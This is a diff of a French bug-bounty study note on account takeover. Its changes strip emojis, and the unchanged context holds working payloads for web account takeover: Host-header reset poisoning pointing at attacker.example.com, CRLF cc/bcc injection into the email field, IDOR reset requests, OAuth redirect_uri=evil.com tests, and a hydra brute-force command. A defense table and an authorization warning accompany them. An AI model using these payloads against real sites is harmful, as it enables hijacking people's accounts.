@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 👤 Account Takeover (ATO)
+# Account Takeover (ATO)
 
 > [!info] **En 1 phrase**
 > ATO = obtenir un **accès non autorisé** au compte d'une victime en abusant d'un mécanisme
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -32,19 +32,19 @@ flowchart LR
     B --> D[Session<br>cookie fixé / volé / rejoué]
     B --> E[Token<br>JWT / OAuth falsifié]
     B --> F[IDOR<br>modifier le user-id d'une requête]
-    C --> G[🎭 Compte de la victime]
+    C --> G[Compte de la victime]
     D --> G
     E --> G
     F --> G
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Le compte n'est jamais piraté "directement" : l'attaquant exploite un **maillon faible de la chaîne
 > de confiance** (email, reset, session, token). Un seul lien cassé = ATO complet.
 
 ---
 
-## 📦 Les vecteurs (vue d'ensemble)
+## Les vecteurs (vue d'ensemble)
 
 | Vecteur | Mécanisme exploité | Impact typique |
 |---|---|---|
@@ -58,11 +58,11 @@ flowchart LR
 
 ---
 
-## 🔑 Password Reset — le champ de bataille principal
+## Password Reset — le champ de bataille principal
 
-> [!warning] ⚠️ **C'est LE vecteur n°1 en bug bounty.** Un reset mal implémenté = ATO en 2 minutes.
+> [!warning] **C'est LE vecteur n°1 en bug bounty.** Un reset mal implémenté = ATO en 2 minutes.
 
-### 🐍 Password Reset Poisoning (Host header)
+### Password Reset Poisoning (Host header)
 
 > L'app construit le lien de reset avec la valeur du **Host header** (ou `X-Forwarded-Host`)
 > → le token part chez l'attaquant au lieu de la victime.
@@ -89,10 +89,10 @@ Forwarded: host=attacker.example.com
 Host: attacker.example.com@victim.example.com   # parsing confus
 ```
 
-> [!tip] 💡 Toujours tester sur **toutes les routes de reset** (`/reset`, `/forgot`, `/recover`)
+> [!tip] Toujours tester sur **toutes les routes de reset** (`/reset`, `/forgot`, `/recover`)
 > et sur le **callback de la page** : le token peut aussi fuiter dans la **réponse HTTP** elle-même.
 
-### 📧 Token leak via Referrer
+### Token leak via Referrer
 
 ```bash
 # 1. Demander un reset → cliquer le lien dans le mail
@@ -107,10 +107,10 @@ Host: twitter.com
 Referer: https://example.com/reset-password.php?token=TOKEN_SECRET
 ```
 
-> [!warning] ⚠️ Le **Referer** peut contenir le token si la page de reset l'embarque en query string.
+> [!warning] Le **Referer** peut contenir le token si la page de reset l'embarque en query string.
 > Tester aussi le token dans le **Referer vers un sous-domaine contrôlé**.
 
-### 🔀 Manipulation du paramètre email
+### Manipulation du paramètre email
 
 > L'app envoie le reset à plusieurs adresses → le token arrive **aussi chez l'attaquant**.
 
@@ -140,7 +140,7 @@ email=victim@example.com%0A%0Dcc:hacker@example.com
 email=victim@example.com%0A%0Dbcc:hacker@example.com
 ```
 
-### 🎯 IDOR sur le reset / change password
+### IDOR sur le reset / change password
 
 > Login avec SON compte, puis modification des paramètres identifiants (ID, email) dans la requête.
 
@@ -159,7 +159,7 @@ POST /reset/confirm
 Body: {"token": "x", "userId": 1337}
 ```
 
-### 🪶 Token faible, réutilisé, non expiré
+### Token faible, réutilisé, non expiré
 
 > La génération du token de reset doit être **aléatoire, unique, courte durée de vie**.
 > Tester les variables probables dans l'algorithme :
@@ -184,7 +184,7 @@ curl -s -X POST https://example.com/v3/user/password/reset -d "email=test@exampl
 # → chercher resetToken / token / access_token dans le JSON de réponse
 ```
 
-### 🧍 Collision de noms d'utilisateur (username)
+### Collision de noms d'utilisateur (username)
 
 > L'app ne normalise pas les identifiants → un compte "proche" permet de piller la victime.
 
@@ -195,7 +195,7 @@ curl -s -X POST https://example.com/v3/user/password/reset -d "email=test@exampl
 # CVE-2020-7245 (CTFd) : champ username tronqué/normalisé
 ```
 
-### 🅰️ Normalisation Unicode
+### Normalisation Unicode
 
 > `ⓞ` (U+24DE) peut être normalisé en `o` par la plateforme → deux comptes distincts en apparence,
 > identiques après normalisation.
@@ -206,19 +206,19 @@ curl -s -X POST https://example.com/v3/user/password/reset -d "email=test@exampl
 # → reset sur le compte attaquant = reset du compte victime
 ```
 
-> [!tip] 💡 **Outils** : [Unisub (tomnomnom)](https://github.com/tomnomnom/hacks/tree/master/unisub)
+> [!tip] **Outils** : [Unisub (tomnomnom)](https://github.com/tomnomnom/hacks/tree/master/unisub)
 > pour trouver des caractères Unicode "équivalents" ; [Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/).
 
 ---
 
-## 🍪 Cookies & Sessions
+## Cookies & Sessions
 
 | Attaque | Mécanisme | PoC rapide |
 |---|---|---|
 | **Cookie fixation** | L'app accepte un cookie posé par l'attaquant → la victime s'authentifie dessus | Poser `session=attacker` via XSS/subdomain, la victime login, on rejoue le cookie |
 | **Pas d'invalidation** | Le cookie reste valable après logout / changement de mdp | Logout puis rejouer l'ancien cookie → toujours authentifié ? |
 | **Réutilisation** | Cookie post-expiration, scope trop large (`*.domain.com`) | Rejouer un cookie capturé plus tard, depuis un autre IP/device |
-| **Vol via XSS** | Cookie non `HttpOnly` récupérable par JS | Voir [[XSS (Cross-Site Scripting)\|🖼️ XSS]] |
+| **Vol via XSS** | Cookie non `HttpOnly` récupérable par JS | Voir [[XSS (Cross-Site Scripting)\| XSS]] |
 
 ```bash
 # Cookie fixation basique
@@ -228,13 +228,13 @@ curl -s -X POST https://example.com/v3/user/password/reset -d "email=test@exampl
 # 4. Attaquant : rejouer le cookie → authentifié en victime
 ```
 
-> [!warning] ⚠️ Vérifier aussi l'**expiration réelle** : beaucoup d'apps n'expirent les sessions que
+> [!warning] Vérifier aussi l'**expiration réelle** : beaucoup d'apps n'expirent les sessions que
 > côté client. Un cookie volé il y a 6 mois reste parfois exploitable. Toujours **rejouer** les cookies
 > sur un autre navigateur/IP pour confirmer.
 
 ---
 
-## 🔏 JWT
+## JWT
 
 > Résumé : le token est **signé** (`header.payload.signature`). ATO = forger/modifier un token
 > pour un autre user en abusant de l'algo (`none`, confusion HS/RS), de la clé (faible, `kid`/`jku`/`jwk`
@@ -251,30 +251,30 @@ curl -s -X POST https://example.com/v3/user/password/reset -d "email=test@exampl
 # 4. Rejouer le token → authentifié en victime
 ```
 
-> [!tip] 💡 Toutes les attaques, payloads et outils dans la note dédiée :
-> → [[Attaques JWT|🔏 JWT]]
+> [!tip] Toutes les attaques, payloads et outils dans la note dédiée :
+> → [[Attaques JWT| JWT]]
 
 ---
 
-## 🔑 OAuth
+## OAuth
 
 | Faiblesse | Effet | Test |
 |---|---|---|
 | **`redirect_uri` permissif** | Le token/code part vers le domaine de l'attaquant | Tester `redirect_uri=https://evil.com`, `//evil.com`, sous-domaines, wildcard |
 | **`state` absent/faible** | CSRF sur le callback → lier le compte victime au compte attaquant | Retirer `state`, le relancer, rejouer le callback |
-| **Token leak** | Le code/token fuit via referer, logs, cache, histoire du navigateur | Associer avec [[Open Redirect\|↪️ Open Redirect]] |
+| **Token leak** | Le code/token fuit via referer, logs, cache, histoire du navigateur | Associer avec [[Open Redirect\|↪Open Redirect]] |
 | **Confusion de flow** | Authorization code ↔ implicit interchangeables | Forcer un flow vers l'autre |
 
-> [!warning] ⚠️ L'ATO OAuth = **lier le compte attaquant au compte victime** (ou voler le token) :
+> [!warning] L'ATO OAuth = **lier le compte attaquant au compte victime** (ou voler le token) :
 > la victime se connecte via le fournisseur, l'attaquant récupère le callback → contrôle du compte.
 >
-> → Note complète : [[OAuth|🔑 OAuth]]
+> → Note complète : [[OAuth| OAuth]]
 
 ---
 
-## 🌐 Autres vecteurs
+## Autres vecteurs
 
-### 🪞 Réponses d'erreur révélatrices & énumération d'emails
+### Réponses d'erreur révélatrices & énumération d'emails
 
 ```bash
 # Différence de réponse = confirmation de l'existence d'un compte
@@ -285,10 +285,10 @@ Reset:    user@example.com → 200 + "email envoyé"
           user@missing.com → 404 / "email introuvable"
 ```
 
-> [!warning] ⚠️ Si **login** et **reset** divergent, on énumère les comptes valides → la base d'un
+> [!warning] Si **login** et **reset** divergent, on énumère les comptes valides → la base d'un
 > password spraying ciblé et de tous les ATO suivants.
 
-### 📧 Changement d'email / de numéro sans vérification
+### Changement d'email / de numéro sans vérification
 
 ```bash
 # 1. Login → section "Mon profil"
@@ -297,7 +297,7 @@ Reset:    user@example.com → 200 + "email envoyé"
 # 4. Demander un reset sur le NOUVEL email → on prend le compte
 ```
 
-### 🔓 Rate limit & bruteforce
+### Rate limit & bruteforce
 
 ```bash
 # Login sans rate limit → bruteforce du mdp
@@ -307,7 +307,7 @@ hydra -l victim@example.com -P rockyou.txt example.com http-post-form \
 # Ou cibler le reset : bruteforce d'un token de reset court (6 chiffres)
 ```
 
-### 🛡️ Bypass 2FA
+### Bypass 2FA
 
 ```bash
 # - Code 2FA réutilisable / non expiré / court (bruteforceable)
@@ -317,13 +317,13 @@ hydra -l victim@example.com -P rockyou.txt example.com http-post-form \
 # - Réponse HTTP/JSON qui diffère si 2FA validée (déduire le code)
 ```
 
-### 🚑 Flows de récupération de compte
+### Flows de récupération de compte
 
 > Les **"account recovery"** (questions secrètes, preuves alternatives, renvoi du mdp en clair)
 > sont souvent mal sécurisés : questions devinables (nom de jeune fille, animal), réponse insensible
 > à la casse, envoi du mdp en clair par email, récupération **sans** validation de l'email.
 
-### 🏴 Subdomain Takeover
+### Subdomain Takeover
 
 > → Section détaillée ci-dessous. Pourquoi ça mène à l'ATO : un sous-domaine piraté sert à
 > **poser des cookies sur le domaine parent** (`*.domain.com`) ou à **phisher la victime**
@@ -331,7 +331,7 @@ hydra -l victim@example.com -P rockyou.txt example.com http-post-form \
 
 ---
 
-## 🏴 Subdomain Takeover
+## Subdomain Takeover
 
 > Un **CNAME DNS** pointe vers un service qui a été **supprimé** (le service n'est plus revendiqué
 > → n'importe qui peut re-créer le service et servir du contenu sur le domaine).
@@ -371,15 +371,15 @@ dig sub.example.com CNAME +short
 | **Netlify / Vercel / Surge / Shopify / Fastly** | pages/projets supprimés |
 | **ReadMe / Gitbook / Cargo** | docs supprimées |
 
-> [!warning] ⚠️ Impact ATO : si le cookie de session est scellé sur `*.example.com`, un sous-domaine
+> [!warning] Impact ATO : si le cookie de session est scellé sur `*.example.com`, un sous-domaine
 > contrôlé peut **poser/fixer un cookie** sur le domaine parent, ou **phisher** la victime sur une
 > page "login" parfaitement légitime.
 >
-> → Note complète (détection/exploitation) : [[03 - Exploitation Web|🌍 Exploitation Web]] §14.4
+> → Note complète (détection/exploitation) : [[03 - Exploitation Web| Exploitation Web]] §14.4
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Risque | Défense |
 |---|---|
@@ -403,9 +403,9 @@ dig sub.example.com CNAME +short
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. **Existence** : le compte existe-t-il ? (login/reset → différences de réponse)
 > 2. **Reset** : manipulation du paramètre email → Host header → IDOR → token faible
 > 3. **Token** : entropie, expiration, réutilisation, leak (referer, réponse, logs)
@@ -414,7 +414,7 @@ dig sub.example.com CNAME +short
 > 6. **Infra** : subdomain takeover, compte orphelin, 2FA
 > Toujours documenter l'impact complet : "qui contrôle quoi ?" à la fin.
 
-> [!warning] ⚠️ **Pièges classiques**
+> [!warning] **Pièges classiques**
 > - "User not found" vs "bad password" : deux réponses différentes = énumération confirmée.
 > - Ne jamais modifier un mot de passe de compte **réel** en bug bounty sans autorisation écrite
 >   (utiliser un compte de test / victime consentante).
@@ -428,7 +428,7 @@ dig sub.example.com CNAME +short
 > - Bien vérifier que le cookie est réellement **réutilisable** (autre navigateur, autre IP) avant
 >   de le déclarer : certaines apps changent de session-id silencieusement.
 
-> [!tip] 💡 **PoC complet à documenter**
+> [!tip] **PoC complet à documenter**
 > 1. URL + méthode + headers + body exacts (requête Burp brute)
 > 2. Capture des réponses (token, redirection, cookie)
 > 3. Preuve de contrôle du compte : 2 screenshots (avant = victime, après = accès)
@@ -438,16 +438,16 @@ dig sub.example.com CNAME +short
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[IDOR|🎯 IDOR]]
-- [[Attaques JWT|🔏 JWT]]
-- [[OAuth|🔑 OAuth]]
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[Open Redirect|↪️ Open Redirect]]
-- [[HTTP Request Smuggling|🚢 HTTP Request Smuggling]]
-- [[CSRF|🛡️ CSRF]]
-- [[Type Juggling|🎭 Type Juggling]]
-- [[Password Cracking|🔐 Password Cracking]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — Account Takeover](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md)
+- [[IDOR| IDOR]]
+- [[Attaques JWT| JWT]]
+- [[OAuth| OAuth]]
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[Open Redirect|↪Open Redirect]]
+- [[HTTP Request Smuggling| HTTP Request Smuggling]]
+- [[CSRF| CSRF]]
+- [[Type Juggling| Type Juggling]]
+- [[Password Cracking| Password Cracking]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — Account Takeover](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md)
